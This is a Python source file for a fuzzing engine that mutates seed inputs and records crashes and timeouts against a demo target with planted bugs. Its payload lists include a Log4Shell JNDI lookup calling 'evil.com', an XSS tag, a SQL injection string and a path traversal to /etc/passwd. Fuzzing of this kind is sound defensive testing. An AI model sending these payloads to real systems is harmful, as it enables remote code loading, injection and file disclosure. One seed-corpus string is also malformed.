#!/usr/bin/env python3
"""
Advanced Fuzzing Engine
Continuous adversarial testing with intelligent mutation strategies.

🦀 13th Hour Fuzzing Engine 🦀
"""

import random
import string
import time
import hashlib
from typing import Dict, List, Any, Optional, Callable, Set
from dataclasses import dataclass, field
from collections import defaultdict
import json
from datetime import datetime


@dataclass
class FuzzingCampaign:
    """Track a fuzzing campaign."""
    start_time: float
    total_iterations: int = 0
    unique_findings: int = 0
    crash_count: int = 0
    timeout_count: int = 0
    coverage: Set[str] = field(default_factory=set)
    findings: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "start_time": datetime.fromtimestamp(self.start_time).isoformat(),
            "duration": time.time() - self.start_time,
            "total_iterations": self.total_iterations,
            "unique_findings": self.unique_findings,
            "crash_count": self.crash_count,
            "timeout_count": self.timeout_count,
            "coverage_size": len(self.coverage),
            "findings_count": len(self.findings)
        }


class MutationStrategy:
    """Base class for mutation strategies."""

    def __init__(self, name: str, weight: float = 1.0):
        self.name = name
        self.weight = weight

    def mutate(self, data: str) -> str:
        """Mutate input data."""
        raise NotImplementedError


class BitFlipMutation(MutationStrategy):
    """Flip random bits in UTF-8 encoding."""

    def __init__(self):
        super().__init__("bit_flip", 0.15)

    def mutate(self, data: str) -> str:
        if not data:
            return data

        # Convert to bytes, flip bit, convert back
        try:
            bytes_data = data.encode('utf-8')
            if not bytes_data:
                return data

            pos = random.randint(0, len(bytes_data) - 1)
            bit = random.randint(0, 7)

            mutated = bytearray(bytes_data)
            mutated[pos] ^= (1 << bit)

            return mutated.decode('utf-8', errors='replace')
        except:
            return data


class ByteInsertionMutation(MutationStrategy):
    """Insert random bytes."""

    def __init__(self):
        super().__init__("byte_insertion", 0.2)

    def mutate(self, data: str) -> str:
        if not data:
            return data

        try:
            bytes_data = data.encode('utf-8')
            pos = random.randint(0, len(bytes_data))

            # Insert interesting bytes
            interesting_bytes = [0x00, 0xFF, 0x7F, 0x80, 0xC0, 0xE0, 0xF0]
            new_byte = random.choice(interesting_bytes)

            mutated = bytearray(bytes_data)
            mutated.insert(pos, new_byte)

            return mutated.decode('utf-8', errors='replace')
        except:
            return data


class UnicodeMutation(MutationStrategy):
    """Insert problematic Unicode characters."""

    def __init__(self):
        super().__init__("unicode", 0.25)
        self.problematic_chars = [
            '\u0000',  # Null
            '\u200B',  # Zero width space
            '\u202E',  # RTL override
            '\uFEFF',  # BOM
            '\uFFFD',  # Replacement char
            '\uFFFF',  # Non-character
            '\x00',    # Null byte
            '\n\r',   # Line ending confusion
            '\t\t\t', # Tab expansion
        ]

    def mutate(self, data: str) -> str:
        if not data:
            return data

        pos = random.randint(0, len(data))
        char = random.choice(self.problematic_chars)
        return data[:pos] + char + data[pos:]


class FormatStringMutation(MutationStrategy):
    """Insert format string specifiers."""

    def __init__(self):
        super().__init__("format_string", 0.1)
        self.format_specs = [
            "%s", "%d", "%x", "%n", "%p",
            "{}", "{:x}", "{:p}",
            "%s%s%s%s", "%n%n%n%n",
            "${jndi:ldap://evil.com}",
        ]

    def mutate(self, data: str) -> str:
        if not data:
            return data

        pos = random.randint(0, len(data))
        spec = random.choice(self.format_specs)
        return data[:pos] + spec + data[pos:]


class LengthMutation(MutationStrategy):
    """Modify string length dramatically."""

    def __init__(self):
        super().__init__("length", 0.15)

    def mutate(self, data: str) -> str:
        if not data:
            return "A" * 1000  # Empty to huge

        choice = random.random()

        if choice < 0.33:
            # Truncate
            if len(data) > 1:
                return data[:random.randint(1, len(data) // 2)]
        elif choice < 0.66:
            # Extend
            return data * random.randint(10, 100)
        else:
            # Empty
            return ""

        return data


class GrammarMutation(MutationStrategy):
    """Mess with structure (JSON, XML, etc.)."""

    def __init__(self):
        super().__init__("grammar", 0.15)

    def mutate(self, data: str) -> str:
        mutations = [
            lambda d: d.replace("{", "{{").replace("}", "}}"),  # Double braces
            lambda d: d.replace("[", "[[").replace("]", "]"),     # Unbalanced
            lambda d: d.replace('"', '""'),                       # Double quotes
            lambda d: d + ",",                                    # Trailing comma
            lambda d: "<" + d + ">",                              # XML wrap
            lambda d: d.replace(":", "::"),                      # Double colon
        ]

        return random.choice(mutations)(data)


class FuzzingEngine:
    """Main fuzzing engine with multiple strategies."""

    def __init__(self, 
                 target_function: Callable[[str], Any],
                 seed_corpus: Optional[List[str]] = None,
                 strategies: Optional[List[MutationStrategy]] = None):
        """
        Initialize fuzzing engine.

        Args:
            target_function: Function to fuzz (takes string, returns any)
            seed_corpus: Initial seed inputs
            strategies: Mutation strategies to use
        """
        self.target = target_function
        self.corpus = seed_corpus or self._default_seed_corpus()
        self.strategies = strategies or self._default_strategies()
        self.campaign = FuzzingCampaign(start_time=time.time())
        self.crashes: List[Dict] = []
        self.unique_crashes: Set[str] = set()

        # Coverage tracking (simplified)
        self.code_paths: Set[str] = set()

    def _default_seed_corpus(self) -> List[str]:
        """Default seed inputs."""
        return [
            "hello",
            "test@example.com",
            "<script>alert(1)</script>",
            "{\"key\": "value\"}",
            "admin' OR '1'='1",
            "../../../etc/passwd",
            "A" * 1000,
            "\u200B\u200C\u200D",
            "",
            "null",
            "undefined",
            "true",
            "false",
            "1234567890",
            "-1",
            "0xFF",
            "\x00\x00\x00",
        ]

    def _default_strategies(self) -> List[MutationStrategy]:
        """Default mutation strategies."""
        return [
            BitFlipMutation(),
            ByteInsertionMutation(),
            UnicodeMutation(),
            FormatStringMutation(),
            LengthMutation(),
            GrammarMutation(),
        ]

    def _select_strategy(self) -> MutationStrategy:
        """Select mutation strategy weighted by probability."""
        total_weight = sum(s.weight for s in self.strategies)
        r = random.uniform(0, total_weight)

        cumulative = 0
        for strategy in self.strategies:
            cumulative += strategy.weight
            if r <= cumulative:
                return strategy

        return self.strategies[-1]

    def _run_target(self, input_data: str) -> Dict:
        """Run target function with timeout and crash detection."""
        result = {
            "input": input_data,
            "output": None,
            "error": None,
            "timeout": False,
            "crash": False,
            "execution_time": 0
        }

        start = time.time()

        try:
            output = self.target(input_data)
            result["output"] = str(output)[:1000]  # Truncate
            result["execution_time"] = time.time() - start

        except TimeoutError:
            result["timeout"] = True
            result["execution_time"] = time.time() - start

        except Exception as e:
            result["error"] = str(e)
            result["crash"] = True
            result["execution_time"] = time.time() - start

        return result

    def _is_interesting(self, result: Dict) -> bool:
        """Determine if result is interesting (crash, new coverage, etc.)."""
        if result["crash"]:
            return True

        if result["timeout"]:
            return True

        # Check for new code path (simplified)
        output_hash = hashlib.md5(str(result["output"]).encode()).hexdigest()
        if output_hash not in self.code_paths:
            self.code_paths.add(output_hash)
            return True

        return False

    def fuzz_one(self) -> Optional[Dict]:
        """Perform one fuzzing iteration."""
        # Select seed from corpus
        seed = random.choice(self.corpus)

        # Select and apply mutation
        strategy = self._select_strategy()
        mutated = strategy.mutate(seed)

        # Run target
        result = self._run_target(mutated)

        self.campaign.total_iterations += 1

        # Check if interesting
        if self._is_interesting(result):
            # Add to corpus if new coverage
            if not result["crash"] and not result["timeout"]:
                self.corpus.append(mutated)

            # Track crashes
            if result["crash"]:
                crash_hash = hashlib.md5(str(result["error"]).encode()).hexdigest()
                if crash_hash not in self.unique_crashes:
                    self.unique_crashes.add(crash_hash)
                    self.campaign.unique_findings += 1
                    self.crashes.append(result)
                    return result

            elif result["timeout"]:
                self.campaign.timeout_count += 1
                return result

        return None

    def run(self, 
           max_iterations: Optional[int] = None,
           max_duration: Optional[float] = None,
           target_findings: Optional[int] = None) -> FuzzingCampaign:
        """
        Run fuzzing campaign.

        Args:
            max_iterations: Maximum iterations (None = infinite)
            max_duration: Maximum duration in seconds (None = infinite)
            target_findings: Stop after N unique findings (None = ignore)

        Returns:
            FuzzingCampaign with results
        """
        print(f"🦀 Starting fuzzing campaign...")
        print(f"   Seed corpus: {len(self.corpus)} inputs")
        print(f"   Strategies: {len(self.strategies)}")
        print(f"   Press Ctrl+C to stop\n")

        try:
            while True:
                # Check stopping conditions
                if max_iterations and self.campaign.total_iterations >= max_iterations:
                    print(f"\nReached max iterations: {max_iterations}")
                    break

                if max_duration and (time.time() - self.campaign.start_time) >= max_duration:
                    print(f"\nReached max duration: {max_duration}s")
                    break

                if target_findings and self.campaign.unique_findings >= target_findings:
                    print(f"\nReached target findings: {target_findings}")
                    break

                # Run iteration
                finding = self.fuzz_one()

                # Progress reporting
                if self.campaign.total_iterations % 1000 == 0:
                    self._report_progress()

                # Report finding
                if finding:
                    self._report_finding(finding)

        except KeyboardInterrupt:
            print("\n\nFuzzing interrupted by user")

        return self.campaign

    def _report_progress(self):
        """Report current progress."""
        elapsed = time.time() - self.campaign.start_time
        rate = self.campaign.total_iterations / elapsed if elapsed > 0 else 0

        print(f"[{self.campaign.total_iterations:,}] "
              f"corpus: {len(self.corpus)}, "
              f"findings: {self.campaign.unique_findings}, "
              f"crashes: {len(self.crashes)}, "
              f"exec/s: {rate:.0f}")

    def _report_finding(self, finding: Dict):
        """Report interesting finding."""
        print(f"\n{'='*60}")
        print(f"🔍 FINDING #{self.campaign.unique_findings}")
        print(f"{'='*60}")
        print(f"Input: {finding['input'][:200]}")
        print(f"Type: {'CRASH' if finding['crash'] else 'TIMEOUT' if finding['timeout'] else 'NEW COVERAGE'}")

        if finding['error']:
            print(f"Error: {finding['error'][:200]}")

        print(f"Time: {finding['execution_time']:.3f}s")
        print(f"{'='*60}\n")

    def save_results(self, filename: str = "fuzzing_results.json"):
        """Save fuzzing results to file."""
        results = {
            "campaign": self.campaign.to_dict(),
            "crashes": self.crashes,
            "corpus_size": len(self.corpus),
            "code_paths": len(self.code_paths),
            "strategies": [s.name for s in self.strategies]
        }

        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)

        print(f"\nResults saved to: {filename}")


if __name__ == "__main__":
    # Demo fuzzing target
    def demo_target(input_data: str) -> str:
        """Demo target function with bugs to find."""

        # Bug 1: Division by zero
        if "div0" in input_data:
            x = 1 / 0

        # Bug 2: Index error
        if "index" in input_data:
            arr = [1, 2, 3]
            return str(arr[100])

        # Bug 3: Format string bug
        if "%s%s" in input_data:
            return input_data % ()  # Will fail

        # Bug 4: Unicode decode error
        if "\xFF\xFE" in input_data:
            return input_data.encode('ascii').decode('utf-8')

        # Normal processing
        return f"Processed: {input_data[:50]}"

    # Run fuzzing
    engine = FuzzingEngine(demo_target)
    campaign = engine.run(max_iterations=10000, max_duration=30)

    print(f"\n{'='*60}")
    print("FUZZING COMPLETE")
    print(f"{'='*60}")
    print(f"Total iterations: {campaign.total_iterations:,}")
    print(f"Unique findings: {campaign.unique_findings}")
    print(f"Crashes: {len(engine.crashes)}")
    print(f"Timeouts: {campaign.timeout_count}")
    print(f"Duration: {time.time() - campaign.start_time:.1f}s")

    engine.save_results("demo_fuzzing_results.json")
